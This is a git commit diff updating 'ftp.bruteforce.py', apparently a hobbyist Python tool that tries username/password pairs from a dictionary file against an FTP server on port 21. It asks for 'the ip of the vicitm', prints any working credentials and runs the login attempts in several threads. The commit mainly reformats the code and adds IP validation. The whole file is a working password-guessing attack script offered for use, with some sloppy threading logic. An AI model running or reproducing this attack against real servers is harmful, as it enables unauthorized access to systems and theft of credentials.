f02dda7c49d77644e9f13aca18b3538f35549ac3
tfwcodes <86290437+tfwcodes@users.noreply.github.com>
2021-08-02 16:18:12 +0300

    Update ftp.bruteforce.py

--- ftp.bruteforce.py
+++ ftp.bruteforce.py
@@ -1,67 +1,76 @@
 import ftplib
 import threading
+import ipaddress
 
-#class the color we will use for input and print
+# class the color we will use for input and print
 class color:
-   PURPLE = '\033[95m'
-   CYAN = '\033[96m'
-   DARKCYAN = '\033[36m'
-   BLUE = '\033[94m'
-   GREEN = '\033[92m'
-   YELLOW = '\033[93m'
-   RED = '\033[91m'
-   BOLD = '\033[1m'
-   UNDERLINE = '\033[4m'
-   END = '\033[0m'
-   CWHITE  = '\33[37m'
+    PURPLE = '\033[95m'
+    CYAN = '\033[96m'
+    DARKCYAN = '\033[36m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
+    CWHITE = '\33[37m'
 
-#brute login
-def brtueLogin(hostname,passwdFile):
-  #it will try to read de password file and if the password file path is incorrect/does not exits it will print file doesnt exist
-  try:
-    pF = open(passwdFile , "r")
-  except :
-    print(color.RED + "[!] File path does not exists")
-  for line in pF.readlines():
-    #split the username
-    userName = line.split(":")[0]
-    #split the password
-    passWord = line.split(":")[1].strip("\n")
-    print( "[+] Trying : "+ color.GREEN + userName + "/" + color.GREEN + passWord)
+
+# brute login
+def brtueLogin(hostname, passwdFile):
+    # it will try to read de password file and if the password file path is incorrect/does not exits it will print file doesnt exist
     try:
-      #start the ftp server
-      ftp = ftplib.FTP(hostname)
-      #try to login with ftp
-      login = ftp.login(userName, passWord)
-      #if its succed then it will print the username + the password
-      print(color.BLUE + "[+] Login Suceeded With :" + userName + "/" + passWord)
-      ftp.quit()
-      return(userName,passWord)
-    #It will print password was not found if it didnt manage to find the password
-    except :
-      pass
-  print(color.RED + "[-] Password was not found")
-  exit()
+        pF = open(passwdFile, "r")
+    except:
+        print(color.RED + "[!] File path does not exists")
+    for line in pF.readlines():
+        # split the username
+        userName = line.split(":")[0]
+        # split the password
+        passWord = line.split(":")[1].strip("\n")
+        print("[+] Trying : " + color.GREEN + userName + "/" + color.GREEN + passWord)
+        try:
+            # start the ftp server
+            ftp = ftplib.FTP(hostname)
+            # try to login with ftp
+            login = ftp.login(userName, passWord)
+            # if its succed then it will print the username + the password
+            print(color.BLUE + "[+] Login Suceeded With :" + userName + "/" + passWord)
+            ftp.quit()
+            return (userName, passWord)
+        # It will print password was not found if it didnt manage to find the password
+        except:
+            pass
+    print(color.RED + "[-] Password was not found")
+    exit()
+
+
+host = input(color.PURPLE + "Enter the ip of the vicitm: ")
+try:
+    ipaddress.ip_address(host)
+    print("The ip is valid")
+except:
+    print("The ip is not valid")
+passwdFile = input(color.PURPLE + "Enter the path file of the dictionary(usernames + passwords): ")
 
 def worker():
-  host = input(color.PURPLE + "Enter the ip of the vicitm: ")
-  passwdFile = input(color.PURPLE + "Enter the path file of the dictionary(usernames + passwords): ")
-  brtueLogin(host,passwdFile)
+    brtueLogin(host, passwdFile)
+
 
 print(
-color.BLUE + 
-"""
-           __ _                                                     _ 
-          / _| |_ _ __    _ __   __ _ ___ _____      _____  _ __ __| |
-         | |_| __| '_ \  | '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
-         |  _| |_| |_) | | |_) | (_| \__ \__   V  V / (_) | | | (_|  | ~>Port 21(Ftp) bruteforce tool<~
-         |_|  \__| .__/  | .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_| ~~>Created by tfwcodes(github)<~~
-                 |_|     |_|
-
-          
-"""
+    color.BLUE +
+    """
+              __ _                                                     _ 
+             / _| |_ _ __    _ __   __ _ ___ _____      _____  _ __ __| |
+            | |_| __| '_ \  | '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
+            |  _| |_| |_) | | |_) | (_| \__ \__   V  V / (_) | | | (_|  | ~>Port 21(Ftp) bruteforce tool<~
+            |_|  \__| .__/  | .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_| ~~>Created by tfwcodes(github)<~~
+                    |_|     |_|
+   
+   """
 )
-#the number of threads for the attack
+# the number of threads for the attack
 number_of_threads = input(color.PURPLE + "Enter the number of threads: ")
 
 worker()
@@ -70,12 +79,12 @@ threads = []
 # start the multithreading
 # int the variable number_of_threads because its an integer
 for i in range(int(number_of_threads)):
-  t = threading.Thread(target=worker)
-  #start the threads
-  t.start()
-  #append the thread t into the list named threads
-  threads.append(t)
+    t = threading.Thread(target=worker)
+    # start the threads
+    t.start()
+    # append the thread t into the list named threads
+    threads.append(t)
 
 for i in range(int(number_of_threads)):
-  #join the threads
-  t.join()
+    # join the threads
+    t.join()
